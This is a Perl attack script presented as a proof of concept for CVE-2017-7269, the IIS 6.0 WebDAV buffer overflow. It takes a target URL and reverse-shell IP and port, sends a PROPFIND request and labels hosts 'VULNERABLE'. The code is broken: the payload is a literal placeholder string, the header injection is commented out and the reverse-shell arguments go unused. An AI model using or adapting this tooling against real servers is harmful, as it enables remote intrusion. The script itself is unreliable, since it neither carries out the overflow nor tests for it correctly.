#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

=pod

=head1 CVE-2017-7269

=head2 Date
2017-03-26

=head2 Reporter(s)
<AUTHOR>

=head2 Description 

Buffer overflow in the ScStoragePathFromUrl function in the WebDAV
service in Internet Information Services (IIS) 6.0 in Microsoft Windows
Server 2003 R2 allows remote attackers to execute arbitrary code via a
long header beginning with "If: <http://" in a PROPFIND request, as
exploited in the wild in July or August 2016.


=cut

# Global Variables
my $DEBUG = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-7269 ]=================================";
    
    print qq{
$title
            
   Reporter : <AUTHOR>
       Date : 2017-03-26
        CVE : CVE-2017-7269
            
Description :


Buffer overflow in the ScStoragePathFromUrl function in the WebDAV
service in Internet Information Services (IIS) 6.0 in Microsoft Windows
Server 2003 R2 allows remote attackers to execute arbitrary code via a
long header beginning with "If: <http://" in a PROPFIND request, as
exploited in the wild in July or August 2016.


};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");
    print " ____     __  __  ____                 ___       __      _     ________       ________    ___      ____     __      \n";
    print "/\\  _`\\  /\\ \\/\\ \\/\\  _`\\             /'___`\\   /'__`\\  /' \\   /\\_____  \\     /\\_____  \\ /'___`\\   /'___\\  /'_ `\\    \n";
    print "\\ \\ \\/\\_\\\\ \\ \\ \\ \\ \\ \\L\\_\\          /\\_\\ /\\ \\ /\\ \\/\\ \\/\\_, \\  \\/___//'/'     \\/___//'/'/\\_\\ /\\ \\ /\\ \\__/ /\\ \\L\\ \\   \n";
    print " \\ \\ \\/_/_\\ \\ \\ \\ \\ \\  _\\L   _______\\/_/// /__\\ \\ \\ \\ \\/_/\\ \\     /' /'_______   /' /' \\/_/// /__\\ \\  _``\\ \\___, \\  \n";
    print "  \\ \\ \\L\\ \\\\ \\ \\_/ \\ \\ \\L\\ \\/\\______\\  // /_\\ \\\\ \\ \\_\\ \\ \\ \\ \\  /' /' /\\______\\/' /'      // /_\\ \\\\ \\ \\L\\ \\/__,/\\ \\ \n";
    print "   \\ \\____/ \\ `\\___/\\ \\____/\\/______/ /\\______/ \\ \\____/  \\ \\_\\/\\_/   \\/______/\\_/       /\\______/ \\ \\____/    \\ \\_\\\n";
    print "    \\/___/   `\\/__/  \\/___/           \\/_____/   \\/___/    \\/_/\\//            \\//        \\/_____/   \\/___/      \\/_/\n";
    print "                                                                                                                    \n";
    print "                                                                                                                    \n";

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0  --url URL --reverse-ip REVERSE-IP --reverse-port REVERSE-PORT [OPTIONS]
        
        # Arguments


            --url [VALUE]		: The Target URL [Format: scheme://host]
            --user-agent [VALUE]		: User-Agent To Send To Server
            --cookie [VALUE]		: Cookie String To Use
            --proxy [VALUE]		: Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]		: Max Timeout For The HTTP Requests
            --auth [VALUE]		: Credentials To Use For HTTP Login [Format: username:password]
            --help        		: Display The Help Menu
            --verbose        		: Be More Verbose
            --debug        		: Debug Mode
            --reverse-ip [VALUE]		: IP To Reverse Connect On
            --reverse-port [VALUE]		: Port On Which Toonnect Back
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'PUT', 'DELETE', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $payload = '?' . $payload if($payload);
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload) if($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $method = 0;
    my $content_type = 0;
    my $base_url = 0;
    my $base_path = 0;
    my $path = 0;
    my $payload = 0;
    my $vulnerable = 1;


    my $auth = 0;		# Command Argument : auth
    my $attacker_ip = "0.0.0.0";		# Command Argument : reverse-ip
    my $proxy = 0;		# Command Argument : proxy
    my $cookie_string = 0;		# Command Argument : cookie
    my $url = 0;		# Command Argument : url
    my $attacker_port = 31337;  		# Command Argument : reverse-port
    my $timeout = 0;		# Command Argument : timeout
    my $useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";		# Command Argument : user-agent
    GetOptions(
    	"auth=s"		=> \$auth,
    	"reverse-ip=s"		=> \$attacker_ip,
    	"help"		=> \&Help,
    	"proxy=s"		=> \$proxy,
    	"cookie=s"		=> \$cookie_string,
    	"debug!"		=> \$DEBUG,
    	"url=s"		=> \$url,
    	"reverse-port=i"		=> \$attacker_port,
    	"timeout=i"		=> \$timeout,
    	"user-agent=s"		=> \$useragent,
    	"verbose!"		=> \$VERBOSE,
    ) or error("Bad Value(s) Provided In Command Line Arguments");

### Required Arguments

    die error("Required Argument(s) Missing .") if(!$url || !$attacker_ip || !$attacker_port);    
    
    exploit_header();
    
    if($url =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i) {
        ($base_url, $base_path) = $url =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    }
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    $browser->default_header('Cookie' => $cookie_string) if($cookie_string);
    
    if($proxy) {
        if($proxy =~ /([a-z])+:\/\/.*:([0-9])+/i) {
            $browser->proxy( [qw( http https ftp ftps )] => $proxy);
        } else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }
    
    
    ### Build/send the requests

  $method = "PROPFIND";
  $path = "";
  $payload = "\$payload";
  $content_type = "application/x-www-form-urlencoded";

  info("Sending Payload To [\$url] ...");
  info("Sending : ($method) $url$path");

  $request = buildRequest($url . $path, $method, $payload, $content_type);
# Set Headers On EXPLOIT1  $request->headers("IF" => "$payload");
  $response = $browser->request($request);
  displayResponse($response);

  $vulnerable = 0 if(!validate("FCODE", "405", $response));
    
    

    ### Validate or not the test
    if($vulnerable) {
        print "\n\n" . color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is affected or any kind of validation was provided.\n";
    } else {
        print "\n\n" . color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $base_url . color("white") . " is not affected.\n";
    }
    
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $status = "FAILED";
    my $status_color = "red";
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    warn("Expected : " . $header_parts[0] . " Not Found In Response Headers");
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        if($VERBOSE || $DEBUG) {
            if($positive) {
                $status = "SUCESS";
                $status_color = "green";
         
                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }
        
        return $positive;
    }
    
    return 0;
}

sub displayResponse {
    my ( $response ) = @_;
    
    print color("white") . "   [" . color("magenta") . "R" . color("white") . "]" . color("blue") . "( URL ) " . color("green") . $response->request->uri . "\n";
    print "\t" . color("blue") . "---[ HTTP Code : " . color("green") . $response->code . "\n";
    
    if($VERBOSE) {
        print "\t" . color("blue") . "---[ HTTP Status : " . color("green") . $response->status . "\n";
        print "\t" . color("blue") . "---[ HTTP Size : " . color("green") . length($response->content) . "\n";
    }
    
    if($DEBUG) {
        
    }
}

sub info {
    my ( $text ) = @_;
    print color("white") . "[" . color("blue") . "*" . color("white") . "]" . color("blue") . " INFO" . color("white") . ": " . color("blue") . " $text\n";
}

sub warning {
    my ( $text ) = @_;
    print color("white") . "[" . color("yellow") . "!" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("blue") . "$text\n";
}

sub error {
    my ( $text ) = @_;
    print color("white") . "[" . color("red") . "-" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("blue") . "$text\n";
    exit;
}
